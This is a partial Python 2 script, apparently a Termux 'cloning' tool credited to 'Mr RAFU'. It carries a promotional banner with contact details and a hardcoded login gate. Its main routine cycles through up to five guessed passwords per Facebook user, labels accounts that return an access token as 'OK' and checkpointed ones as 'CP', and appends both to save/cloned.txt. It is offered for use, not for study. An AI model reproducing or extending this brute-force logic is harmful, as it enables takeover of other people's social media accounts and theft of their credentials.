...
\033[1;94mFACEBOOK  Mr RAFU
                  
\033[1;92mWHATAAPP   +8801982876336

"""

####Logo####

logo1 = """ _______   __  .__   __.   ______   
|       \ |  | |  \ |  |  /  __  \  
|  .--.  ||  | |   \|  | |  |  |  | 
|  |  |  ||  | |  . `  | |  |  |  | 
|  '--'  ||  | |  |\   | |  `--'  | 
...
"""
print("""
Author: Mr RAFU(BALOCH)
Facebook: Mr RAFU
fb group: Termux Pros
Warning :⚠️ INBOX ME FACEBOOK FOR HELP⚠️

""")
CorrectUsername = "RAFU"
CorrectPassword = "ETY"
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(Mr-RAFU-OK)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(Mr-RAFU-CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Mr-RAFU-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(Mr-RAFU-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Mr-RAFU-OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(Mr-RAFU-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Mr-RAFU-OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(Mr-RAFU-CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Mr-RAFU-OK)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(Mr-RAFU-CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
